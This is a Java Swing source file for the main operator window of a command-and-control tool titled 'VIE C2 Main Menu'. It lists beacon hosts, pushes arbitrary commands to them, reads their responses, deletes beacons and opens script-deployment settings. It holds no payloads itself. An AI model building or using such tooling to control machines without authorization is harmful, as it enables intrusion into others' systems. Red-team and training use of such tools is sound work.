import javax.swing.*;
import java.awt.*;
import java.io.BufferedReader;
import java.io.File;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.io.FileReader;
import java.io.IOException;
import java.lang.reflect.Array;
import java.util.*;
import java.nio.file.*;
import java.util.stream.Stream;

public class MenuForm extends JFrame { // Make sure Class extends JFrame
    private JPanel menuPanel; // Manually create this JPanel object and link it in the swing form editor
    private JTextField commandText;
    private JButton sendAllButton;
    private JList<String> hostList;
    private JList<String> readList;
    private JList<String> responseList;
    private JButton deployButton;
    private JButton sendSelectedButton;
    private JButton readResponseButton;
    private JScrollPane pingScroll;
    private JScrollPane responseScroll;
    private JButton deleteBeaconFromSelectedButton;
    private JButton deleteBeaconFromAllButton;
    private JButton addAliasToSelectedButton;
    private JButton deleteAliasFromSelectedButton;
    private JButton switchToWindowsButton;
    private JButton getInformationButton;
    private JButton updateBeaconTimeButton;
    //private JLabel pictureLabel;
    private RequestCalls apiHandle;
    private String battleship;
    private Boolean deployOpen;
    private final HashMap<String, String> AliasHost;
    private final HashMap<String, String> HostID;
    private final HashMap<String, String> IDHost;
    private final HashMap<String, Integer> IPPing;
    private final HashMap<Integer , ArrayList<String>> ToggleMap;
    private final ArrayList<String> linuxHostNames;
    private final ArrayList<String> windowsHostNames;
    int osToggle;

    public MenuForm(RequestCalls apiHandle) throws IOException {
        this.apiHandle = apiHandle;
        this.linuxHostNames = new ArrayList<>();
        this.windowsHostNames = new ArrayList<>();
        //ImageIcon raw = new ImageIcon("SwaminHolder.png");
        //pictureLabel.setIcon(new ImageIcon(new ImageIcon(getClass().getResource("/resources/Cross.png")).getImage().getScaledInstance(50, 50, Image.SCALE_REPLICATE)));
        this.deployOpen = false;
        this.AliasHost = new HashMap<>();
        this.HostID = new HashMap<>();
        this.IDHost = new HashMap<>();
        this.IPPing = new HashMap<>();
        this.ToggleMap = new HashMap<>();
        ToggleMap.put(1, linuxHostNames);
        ToggleMap.put(2, windowsHostNames);
        setContentPane(menuPanel); // Set the content pane to the panel object you manually created
        setSize(900, 500); // Sets size
        setLocationRelativeTo(null);
        setTitle("VIE C2 Main Menu"); // Title
        setIconImage(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/resources/SwaminHolder.png")));
        setResizable(true); // Resizable
        setVisible(true); // Visible
        setDefaultCloseOperation(EXIT_ON_CLOSE); // If this is activated, the entire project closes when the X button the specific JPanel is pressed
        //setDefaultCloseOperation(DO_NOTHING_ON_CLOSE);
        pingScroll.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
        responseScroll.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
        hostList.setCellRenderer(new ClientListRender());
        responseList.setCellRenderer(new ResponseListRender());
        osToggle = 1;
        UpdateListLoop();
        LoadSaves();
        addWindowListener(new WindowAdapter() {
            @Override
            public void windowClosing(WindowEvent e) {
                AliasHost.forEach((key, value) -> {
                    String saveString = key+","+value+"\n";
                    try {
                        Files.writeString(Path.of("AliasSave.txt"), saveString, StandardOpenOption.CREATE, StandardOpenOption.APPEND);
                    } catch (IOException ex) {
                        throw new RuntimeException(ex);
                    }
                });
                MenuForm.this.dispose();
            }
        });
        switchToWindowsButton.addActionListener(new ActionListener(){

            @Override
            public void actionPerformed(ActionEvent e) {
                osToggle = osToggle == 2 ? 1 : 2;
                String newLabel = osToggle == 2 ? "Windows" : "Linux";
                String newDeployLabel = osToggle == 2 ? "Deployable Windows scripts" : "Deployable Linux Scripts";
                switchToWindowsButton.setText(newLabel);
                deployButton.setText(newDeployLabel);
                try {
                    UpdateList();
                } catch (IOException | InterruptedException ex) {
                    throw new RuntimeException(ex);
                }
            }
        });
        sendAllButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                PushAll();
            }
        });
        getInformationButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                GetInformation();
            }
        });
        readResponseButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                GetResponse();
            }
        });
        sendSelectedButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                PushSingle();
            }
        });
        /*getLastPingButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                GetLastPing();
            }
        });*/
        deployButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                if(osToggle==1) {
                    BattleshipSettings bss = new BattleshipSettings(apiHandle);
                    bss.setVisible(true);
                }
            }
        });
        deleteBeaconFromSelectedButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                if(hostList.getSelectedValue()==null){
                    new CustomDialog("No value selected!", "Something went wrong!", "Warning.png");
                    return;
                }
                new CausionForm(hostList.getSelectedValue(), osToggle, apiHandle);
            }
        });
        deleteBeaconFromAllButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                new CausionForm("a", osToggle, apiHandle);
            }
        });
        deleteAliasFromSelectedButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                AliasHost.remove(hostList.getSelectedValue());
            }
        });
        addAliasToSelectedButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                if(hostList.getSelectedValue()==null){
                    new CustomDialog("No value selected!", "Something went wrong!", "Warning.png");
                    return;
                }
                new AliasForm(hostList.getSelectedValue(),MenuForm.this);
            }
        });
    }
    public void setAlias(String host, String alias){
        AliasHost.put(alias, IDHost.get(host));
    }
    public class ClientListRender extends DefaultListCellRenderer {
        @Override
        public Component getListCellRendererComponent(JList list, Object value, int index, boolean isSelected, boolean cellHasFocus) {
            String ico = "";
            //ico = lastPing<4 ? "green" : "red"; // 4 Seconds until the interface assumes device is offline
            int lastPing = IPPing.get((String)value);
            if(lastPing <=30){
                ico = "green";
            }else if(lastPing <=100){
                ico = "yellow";
            }else{
                ico = "red";
            }
            String hostName = IDHost.get(value);
            String entryValue = AliasHost.containsKey(hostName) ? AliasHost.get(hostName)+" | "+(String)hostName : (String)hostName;
            //System.out.println("IP: "+(String)value+", Contains: "+IPAlias.containsValue((String)value));
            setText(entryValue+": "+lastPing);
            //setIcon(new ImageIcon(getClass().getResource("/resources/"+ico + ".png")));
            setIcon(new ImageIcon(new ImageIcon(getClass().getResource("/resources/"+ico + ".png")).getImage().getScaledInstance(20, 20, Image.SCALE_REPLICATE)));

            if (isSelected) {
                setBackground(list.getSelectionBackground());
                setForeground(list.getSelectionForeground());
            } else {
                setBackground(list.getBackground());
                setForeground(list.getForeground());
            }
            return this;
        }
    }
    public class ResponseListRender extends DefaultListCellRenderer {
        @Override
        public Component getListCellRendererComponent(JList list, Object value, int index, boolean isSelected, boolean cellHasFocus) {
            setText(IDHost.get((String)value)+" | "+value);
            if (isSelected) {
                setBackground(list.getSelectionBackground());
                setForeground(list.getSelectionForeground());
            } else {
                setBackground(list.getBackground());
                setForeground(list.getForeground());
            }
            return this;
        }
    }
    private void LoadSaves() throws IOException {
        if(!new File("AliasSave.txt").createNewFile()){
            BufferedReader br = new BufferedReader(new FileReader("AliasSave.txt"));
            String keyValPair;
            while ((keyValPair = br.readLine()) != null) {
                AliasHost.put(keyValPair.split(",")[0],keyValPair.split(",")[1]);
            }
        }
    }
    private void PushAll(){
        try {
            String resp = apiHandle.Push(commandText.getText(),"a", osToggle);
            System.out.println(resp);
            switch (resp) {
                case "1" -> new CustomDialog("Backend file write failed!", "Something went wrong!", "Warning.png");
                case "2" -> new CustomDialog("Command file deleted. Backend was compromised!", "Something went wrong!", "Warning.png");
                case "0" -> new CustomDialog("Command successfully pushed!", "Operation successful!");
            }
        } catch (IOException | InterruptedException ex) {
            new CustomDialog("Couldn't fetch: "+ex, "Something went wrong!", "Warning.png");
        }
    }
    private void PushSingle(){
        try {
            if(hostList.getSelectedValue()==null){
                new CustomDialog("No value selected!", "Something went wrong!", "Warning.png");
                return;
            }
            ArrayList<ArrayList<String>> responseList = new ArrayList<>();
            ArrayList<String> hostArr = (ArrayList<String>)hostList.getSelectedValuesList();
            for(String host : hostArr){
                ArrayList<String> associate = new ArrayList<>(); // Associate IP with response -> [IP, response]
                String resp = apiHandle.Push(commandText.getText(),host,osToggle);
                associate.add(0, host); associate.add(1, resp);
                responseList.add(associate);
            }
            StringBuilder totalResponse = new StringBuilder();
            boolean badResponseFlag = false;
            for(ArrayList<String> associate : responseList){
                totalResponse.append(associate.get(0)).append(" -> ");
                switch (associate.get(1)) {
                    case "1" -> {
                        totalResponse.append("Backend file write failed!\n");
                        badResponseFlag = true;
                    }
                    case "2" -> {
                        totalResponse.append("Command file deleted. Backend was compromised!\n");
                        badResponseFlag = true;
                    }
                    case "0" -> totalResponse.append("Command successfully pushed!\n");
                }
            }
            if(!badResponseFlag){
                new CustomDialog(totalResponse.toString(), "Operation successful!");
            }else{
                new CustomDialog(totalResponse.toString(), "Something went wrong!", "Warning.png");
            }
        } catch (IOException | InterruptedException ex) {
            new CustomDialog("Couldn't fetch: "+ex, "Something went wrong!");
        }
    }
    private void GetInformation() {
        try {
            if(hostList.getSelectedValue()==null){
                new CustomDialog("No value selected!", "Something went wrong!", "Warning.png");
                return;
            }
            String resp = apiHandle.GetInfo(hostList.getSelectedValue(),osToggle);
            if(resp.equals("1")){
                new CommandOutputForm("No response");
            }else {
                new CommandOutputForm(resp);
            }
        } catch (IOException | InterruptedException ex) {
            new CustomDialog("Couldn't fetch: "+ex, "Something went wrong!");
        }
    }
    private void GetResponse() {
        try {
            if(responseList.getSelectedValue()==null){
                new CustomDialog("No value selected!", "Something went wrong!", "Warning.png");
                return;
            }
            String resp = apiHandle.FetchResponse(responseList.getSelectedValue(), osToggle);
            if(resp.equals("1")){
                new CommandOutputForm("No response");
            }else {
                new CommandOutputForm(resp);
            }
        } catch (IOException | InterruptedException ex) {
            new CustomDialog("Couldn't fetch: "+ex, "Something went wrong!");
        }
    }
    /*private void GetLastPing() {
        try {
            String resp = apiHandle.GetLastPing(pingList.getSelectedValue(),osToggle);
            if(pingList.getSelectedValue()==null){
                new CustomDialog("No value selected!", "Something went wrong!", "Warning.png");
                return;
            }
            if(resp.equals("1")){
                new CustomDialog("No response!", "Something went wrong!", "Warning.png");
            }else {
                new CustomDialog("Last ping "+resp+" seconds ago.", "Operation successful!");
            }
        } catch (IOException | InterruptedException ex) {
            new CustomDialog("Couldn't fetch: "+ex, "Something went wrong!", "Warning.png");
        }
    }*/
    private void UpdateList() throws IOException, InterruptedException {
        String[] idPingList = apiHandle.findClients(osToggle).split("\n");
        String[] sortedPingList = new String[idPingList.length]; // Curious case, we have to sort this array based on the alphabetical order of the associated host names
        String[] idResponseList = apiHandle.findClientResponses(osToggle).split("\n");
        //ArrayList<String> selections = (ArrayList<String>) hostList.getSelectedValuesList();
        for (String id : idPingList) {
            if(!IDHost.containsKey(id)){
                String hostName = apiHandle.GetHost(id, osToggle);
                HostID.put(hostName, id);
                IDHost.put(id, hostName);
                this.ToggleMap.get(osToggle).add(hostName);
            }
            int lastPing = Integer.parseInt(apiHandle.GetLastPing(id, 3));
            IPPing.put(id, lastPing);
        }
        Collections.sort(this.ToggleMap.get(osToggle)); // Sort this list for the NEXT iteration
        ArrayList<Integer> takeList = new ArrayList<>();
        for (String id : idPingList) {
            int takeIndex = this.ToggleMap.get(osToggle).indexOf(IDHost.get(id));
            if(takeList.contains(takeIndex)) {
                int i = 1;
                while(takeList.contains(takeIndex+i)){ // Keep incrementing until you find an empty entry
                    i = (i+1)%((ToggleMap.get(osToggle)).toArray().length);
                }
                sortedPingList[takeIndex+i] = id; // Take the index of where the hostname is in the SORTED array and make it the same index as in the ID array
                takeList.add(takeIndex+i);
            }else{
                sortedPingList[takeIndex]  = id;
                takeList.add(takeIndex);
            }
        }
        /*hostList.setValueIsAdjusting(true);
        for(String host : selections){ // Preserve selections
            int newind = new ArrayList<>(Arrays.asList(sortedPingList)).indexOf(host);
            if(newind != 1){
                hostList.addSelectionInterval(newind, newind);
            }
        }
        hostList.setValueIsAdjusting(false);*/
        this.responseList.setListData(idResponseList);
        this.hostList.setListData(sortedPingList);
    }
    private void UpdateListLoop() {
        //String[] ipReadList = apiHandle.findClientReads().split("\n");
        //this.readList.setListData(ipReadList);
        // Fetch pings every 10 seconds
        Thread updateThread = new Thread(() -> {
            while (true) {
                try {
                    UpdateList();
                    Thread.sleep(8000); // Fetch pings every 10 seconds
                } catch (IOException | InterruptedException ex) {
                    new CustomDialog("Couldn't fetch: " + ex, "Something went wrong!", "Warning.png");
                }
            }
        });
        updateThread.start();
    }

}
